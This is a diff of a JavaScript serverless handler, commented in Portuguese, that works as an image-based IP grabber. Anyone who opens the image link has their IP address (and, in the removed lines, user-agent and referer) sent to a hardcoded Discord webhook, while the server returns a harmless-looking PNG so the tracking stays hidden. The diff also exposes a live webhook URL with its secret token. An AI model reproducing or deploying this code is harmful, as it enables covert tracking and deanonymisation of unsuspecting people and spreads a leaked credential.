@@ -2,46 +2,13 @@ import fs from 'fs';
 import path from 'path';
 
 export default async function handler(req, res) {
-  // TENTA VÁRIAS FORMAS DE PEGAR IP REAL
-  const forwarded = req.headers['x-forwarded-for'];
-  const realIp = req.headers['x-real-ip'];
-  const cfConnectingIp = req.headers['cf-connecting-ip']; // Cloudflare
-  const connectionIp = req.connection?.remoteAddress;
-  const socketIp = req.socket?.remoteAddress;
+  // 1. CAPTURA O IP
+  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 'IP não detectado';
   
-  // Decifra o IP REAL
-  let ip = 'IP não detectado';
+  console.log('📸 IP capturado:', ip);
+  console.log('📁 Foto usada: foto-discord2.png');
   
-  if (forwarded) {
-    // Pega o PRIMEIRO IP da lista (usuário real)
-    const ips = forwarded.split(',').map(ip => ip.trim());
-    ip = ips[0];
-    console.log('📊 IPs no x-forwarded-for:', ips);
-  } else if (cfConnectingIp) {
-    ip = cfConnectingIp;
-  } else if (realIp) {
-    ip = realIp;
-  } else if (connectionIp) {
-    ip = connectionIp.replace('::ffff:', '');
-  } else if (socketIp) {
-    ip = socketIp.replace('::ffff:', '');
-  }
-  
-  console.log('========== CAPTURA DE IP ==========');
-  console.log('🌐 IP CAPTURADO:', ip);
-  console.log('🕐 Data:', new Date().toLocaleString('pt-BR'));
-  console.log('🔗 User-Agent:', req.headers['user-agent']?.substring(0, 80));
-  console.log('📊 Referer:', req.headers['referer'] || 'Direto');
-  console.log('==================================');
-  
-  // SE for IP do Discord (seus servidores)
-  const discordIps = ['162.159.128.233', '162.159.129.233', '162.159.130.233', '162.159.133.233'];
-  if (discordIps.includes(ip)) {
-    console.log('⚠️ ATENÇÃO: Este é o IP do Discord (proxy)');
-    console.log('👤 O usuário REAL não foi detectado porque Discord fez cache');
-  }
-  
-  // Envia para Discord webhook
+  // 2. DISCORD WEBHOOK
   const webhook = 'https://discord.com/api/webhooks/1456767774368993380/-412QnxkT_spPdRfKW2uuhMevQM23-v7XGR9yjOfz0ymAg7ooyJZ85kBILbzAEiaIZQ-';
   
   try {
@@ -49,21 +16,50 @@ export default async function handler(req, res) {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        content: `🌐 **TENTATIVA DE ACESSO**\nIP Detectado: \`${ip}\`\n⚠️ Pode ser proxy do Discord\n🕐 ${new Date().toLocaleString('pt-BR')}`
+        content: `📸 **foto-discord2.png** acessada!\n🌐 IP: ${ip}`
       })
     });
-  } catch (e) {}
+  } catch (e) {
+    console.log('Erro Discord');
+  }
   
-  // Envia a foto
+  // 3. ENVIA foto-discord2.png (AQUI MUDA!)
   try {
-    const fotoPath = path.join(process.cwd(), 'public', 'minha-foto.png');
+    // CAMINHO DA FOTO NOVA
+    const fotoPath = path.join(process.cwd(), 'public', 'foto-discord2.png');
+    
+    console.log('🔍 Procurando foto em:', fotoPath);
+    
+    // Verifica se existe
+    if (!fs.existsSync(fotoPath)) {
+      console.log('❌ foto-discord2.png não encontrada!');
+      console.log('📁 Arquivos em public/:');
+      
+      // Lista o que tem na pasta public
+      const publicDir = path.join(process.cwd(), 'public');
+      const arquivos = fs.readdirSync(publicDir);
+      console.log(arquivos);
+    }
+    
     const fotoBuffer = fs.readFileSync(fotoPath);
     
+    // Envia a foto
     res.setHeader('Content-Type', 'image/png');
+    res.setHeader('Cache-Control', 'no-cache');
     res.send(fotoBuffer);
     
+    console.log('✅ foto-discord2.png enviada!');
+    
   } catch (error) {
-    console.log('❌ Erro na foto');
-    res.status(404).send('Foto não encontrada');
+    console.log('❌ ERRO:', error.message);
+    
+    // Fallback: pixel vermelho
+    const pixel = Buffer.from(
+      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
+      'base64'
+    );
+    
+    res.setHeader('Content-Type', 'image/png');
+    res.send(pixel);
   }
 }
